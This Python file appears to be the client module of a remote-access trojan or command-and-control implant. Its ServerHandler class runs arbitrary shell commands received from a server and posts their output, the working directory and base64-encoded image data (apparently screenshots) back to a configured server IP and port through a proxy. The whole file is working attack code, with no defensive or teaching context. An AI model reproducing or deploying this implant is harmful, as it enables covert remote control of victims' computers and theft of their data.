import os
import base64
import subprocess
import urllib.parse
from termcolor import colored
from requests import post, exceptions
from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER,  CMD_RESPONSE,
                             RESPONSE_KEY)


class ServerHandler():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.client_cwd = None


    # Post data to server
    def post_to_server(self, message="", response_path=CMD_RESPONSE, image_data=None):
        data = {
            RESPONSE_KEY: message,
            'cwd': os.getcwd()
        }
        if image_data:
            b64_str = base64.b64encode(image_data).decode()
            data['image'] = urllib.parse.quote(b64_str, safe='')
        try:
            post(f"http://{SERVER_IP}:{SERVER_PORT}{response_path}", data=data,
                 headers=HEADER, proxies=PROXY)
        except exceptions.RequestException:
            return


    @staticmethod
    def convert_text(text):
        return colored(text, "cyan", attrs=["bold"])


    def run_command(self, command):
        if command.startswith('cd ') and command != 'cd':
            path = command[3:].strip()
            try:
                os.chdir(path)
                self.post_to_server(os.getcwd(), response_path=CMD_RESPONSE)
            except OSError as e:
                self.post_to_server(f"Error: {e}\n", response_path=CMD_RESPONSE)
            return

        if command.strip() == 'cd':
            try:
                result = subprocess.run('cd', shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                self.post_to_server(output, response_path=CMD_RESPONSE)
            except Exception as e:
                self.post_to_server(f"Error: {e}\n", response_path=CMD_RESPONSE)
            return

        # All other commands
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            self.post_to_server(output, response_path=CMD_RESPONSE)
        except Exception as e:
            self.post_to_server(f"Error: {e}\n", response_path=CMD_RESPONSE)

